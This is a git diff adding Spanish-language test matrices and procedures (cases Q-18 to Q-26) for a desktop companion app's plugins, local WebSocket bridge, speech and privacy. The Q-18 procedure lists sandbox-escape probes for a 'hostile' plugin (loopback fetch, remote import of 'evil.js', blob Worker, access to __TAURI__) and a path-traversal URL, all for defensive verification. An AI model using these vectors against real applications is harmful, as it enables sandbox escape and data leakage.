@@ -130,6 +130,83 @@ Para validar un nuevo entorno (por ejemplo, Nobara KDE o Windows 11):
    ```bash
    npm run tauri dev
    ```
-2. Ejecutar la secuencia de casos Q-01 a Q-17 anotando cualquier desviación visual o de rendimiento.
+2. Ejecutar la secuencia de casos Q-01 a Q-17 (y Q-18 a Q-26 en plataformas con F6 habilitado) anotando cualquier desviación visual o de rendimiento.
 3. Medir el consumo de RAM y CPU en reposo durante al menos 60 segundos.
-4. Actualizar las columnas correspondientes en la matriz anterior.
+4. Actualizar las columnas correspondientes en las matrices de pruebas.
+
+---
+
+## Matriz de Casos de Prueba (F6 — Plugins, Puente Local y Habla)
+
+> Alcance Linux-first ([`LIMITATIONS.md`](LIMITATIONS.md#l-06-alcance-linux-first-para-fase-6-plugins-habla-y-puente-websocket-local)). En E4 (Windows), los casos dependientes de `CursorBridge` D-Bus (`Q-23`, `Q-24`) no aplican (`—`).
+
+| ID   | Categoría   | Caso                                | Comportamiento esperado                                                                                                         | E1  | E2  | E3  | E4  |
+| ---- | ----------- | ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- | --- | --- | --- | --- |
+| Q-18 | Seguridad   | Plugin hostil en WebKitGTK real     | `fetch`, `import()` remoto, `WebSocket`, `Worker(blob)`, `window.parent` y `__TAURI__` fallan con **0 tráfico TCP**.            | ⬜  | ⬜  | ⬜  | ⬜  |
+| Q-19 | Seguridad   | Puente WS anti-CSWSH y token        | HTTP Upgrade con `Origin` da `403`; token inválido/ausente cierra con `forbidden`; `bridge.json` es `0600` y se borra al salir. | ⬜  | ⬜  | ⬜  | ⬜  |
+| Q-20 | Plugins     | Ejemplo `hello-companion`           | Sin errores CSP; tras aprobar permisos, clic en `head` → `surprised` + `say` y en `body` → `happy` + `say`; máx. 3 activos.     | ⬜  | ⬜  | ⬜  | ⬜  |
+| Q-21 | Habla       | Stream `DSK1` y audio en frío       | `echo_tts_bridge.py` reproduce PCM en frío (`AudioContext` sin gesto previo), anima boca y burbuja sin romper click-through.    | ⬜  | ⬜  | ⬜  | ⬜  |
+| Q-22 | Animaciones | Registro lógico `.vrma`             | Comando `animation` con ID registrado reproduce el clip; ID desconocido o ruta cruda responde `unknown_animation`.              | ⬜  | ⬜  | ⬜  | ⬜  |
+| Q-23 | Privacidad  | `windowFocus` modos `0` y `1`       | Sin `desktop:events` no hay emisiones; con `desktop:events` (default sin `windowTitle`), solo `appId` cruza D-Bus.              | ⬜  | ⬜  | ⬜  | —   |
+| Q-24 | Privacidad  | `windowFocus` modo `2` (con título) | Al activar `desktop:windowTitle` en Ajustes, llegan `appId` y `title`; al apagarlo, `title` deja de emitirse al instante.       | ⬜  | ⬜  | ⬜  | —   |
+| Q-25 | Rendimiento | Presupuesto en 3 estados + soak     | < 200 MB RSS en los 3 estados; tras 10 min de stream + 1 min idle vuelve a 10 FPS (< 3 % CPU) y `AudioContext` `suspended`.     | ⬜  | ⬜  | ⬜  | ⬜  |
+| Q-26 | Resiliencia | Ocultar ventana durante habla       | Al ocultar desde tray en pleno habla, emite `speechEnd` (`reason: "hidden"`), suelta wake lock y comandos dan `hidden`.         | ⬜  | ⬜  | ⬜  | ⬜  |
+
+### Procedimiento de Prueba: Plugin Hostil en WebKitGTK Real (Q-18)
+
+1. Levantar un listener TCP espía en loopback para confirmar **0 fugas de red**:
+   ```bash
+   python3 -c '
+   import socket
+   s = socket.socket()
+   s.bind(("127.0.0.1", 19876))
+   s.listen(8)
+   print("Listening on 127.0.0.1:19876")
+   while True:
+       conn, addr = s.accept()
+       print("LEAK DETECTED from", addr, conn.recv(512))
+       conn.close()
+   '
+   ```
+2. Crear un plugin temporal de auditoría en `"${XDG_DATA_HOME:-$HOME/.local/share}/dev.crivera.deskumi/plugins/hostile-probe/"` con:
+   - `manifest.json`: `"id": "hostile-probe"`, `"entry": "index.html"`, `"permissions": ["avatar:speak"]`.
+   - `index.html`: `<script src="./main.js"></script>` (sin scripts inline).
+   - `main.js`: ejecuta en un `try/catch` los 6 vectores de escape y reporta el resultado por `postMessage` o `console.info`:
+     1. `fetch("http://127.0.0.1:19876/leak")`
+     2. `fetch("http://ipc.localhost/get_platform_caps")` y `fetch("ipc://localhost/get_platform_caps")`
+     3. `import("http://127.0.0.1:19876/evil.js")`
+     4. `new WebSocket("ws://127.0.0.1:19876/")` (y contra el puerto de `bridge.json`)
+     5. `new Worker(URL.createObjectURL(new Blob(["fetch('http://127.0.0.1:19876/worker')"])))`
+     6. Lectura de `window.parent.document`, `window.__TAURI__`, `window.parent.__TAURI__`, `window.__TAURI_INTERNALS__` y verificación de `window.origin === "null"`.
+3. Habilitar `hostile-probe` en **Ajustes → Plugins aislados y animaciones** y reiniciar o recargar.
+4. Verificar adicionalmente path traversal sobre el protocolo custom (desde Web Inspector o script): `plugin://hostile-probe/../settings.json` debe devolver `403 Forbidden`.
+5. **Criterio de aceptación:** todos los vectores fallan (`TypeError` / `SecurityError` / `undefined`), **0 líneas `LEAK DETECTED`** en el listener TCP de `127.0.0.1:19876` y **0 conexiones** aceptadas en `local_bridge.rs`. Eliminar el directorio `hostile-probe` al terminar.
+
+### Procedimiento de Verificación en 3 Estados y Soak de 10 Minutos (Q-25)
+
+Medir RSS total (`deskumi` + `WebKitWebProcess` + `WebKitNetworkProcess`), CPU %, FPS (con `debugOverlay`) y estado de `AudioContext` / PipeWire (`pw-top` o `pactl list sink-inputs`) en tres estados secuenciales:
+
+| Estado | Condición operativa                                                               | Límite objetivo                                                                                             | Valor medido (E1) | Estado |
+| ------ | --------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | ----------------- | ------ |
+| **1**  | Puente WebSocket apagado + 0 plugins activos + sin habla                          | < 200 MB RSS, 0 MB overhead, 10 FPS (< 3 % CPU)                                                             | _Pendiente_       | ⬜     |
+| **2**  | Puente activo + 1 cliente WS conectado + 1 plugin (`hello-companion`) en reposo   | < 200 MB RSS (~165–170 MB esperado), 10 FPS (< 3 % CPU), `AudioContext` sin correr                          | _Pendiente_       | ⬜     |
+| **3a** | Stream PCM `DSK1` continuo durante **10 minutos** (chunks cada 100 ms @ 22050 Hz) | < 200 MB RSS (sin crecimiento monotónico entre min 1, 5 y 10)                                               | _Pendiente_       | ⬜     |
+| **3b** | **1 minuto después** de `speakEnd` (sin tráfico WS ni clicks)                     | Retorno automático a **10 FPS**, CPU < 3 %, `AudioContext.state === "suspended"` (stream PipeWire liberado) | _Pendiente_       | ⬜     |
+
+Comando auxiliar de muestreo durante el soak de 10 minutos:
+
+```bash
+watch -n 5 'ps -o pid,rss,%cpu,comm -C deskumi,WebKitWebProcess,WebKitNetworkProcess'
+```
+
+### Procedimiento de Verificación de `windowFocus` por Scopes en E1 y E2 (Q-23, Q-24)
+
+1. Activar el puente WebSocket local en Ajustes y conectar un cliente suscrito a `events: ["windowFocus"]` (ver [`PLUGINS.md`](PLUGINS.md)).
+2. En paralelo, observar el bus D-Bus de sesión para comprobar qué envía el compositor:
+   ```bash
+   dbus-monitor --session "interface='org.deskumi.CursorBridge'"
+   ```
+3. **Prueba en E1 (Fedora GNOME 50 + extensión `deskumi-cursor-bridge@deskumi.org`) y E2 (Nobara KDE Plasma + KWin Script):**
+   - **Paso A (`desktop:events` desactivado, estado inicial):** alternar foco entre 2–3 ventanas (Terminal, navegador, editor). Verificar **0 mensajes** `ReportWindowFocus` en `dbus-monitor` y **0 eventos** `windowFocus` en el cliente WS.
+   - **Paso B (`desktop:events` activado, `desktop:windowTitle` desactivado):** alternar ventanas. Verificar que `windowFocus` llega con `appId` definido y **sin propiedad `title`** (y sin títulos en los argumentos de `ReportWindowFocus` en `dbus-monitor`).
+   - **Paso C (`desktop:windowTitle` activado):** confirmar aviso de privacidad en Ajustes, alternar ventanas y verificar que `windowFocus` incluye `appId` y `title`. Desmarcar `desktop:windowTitle` y confirmar el retorno inmediato al Paso B.
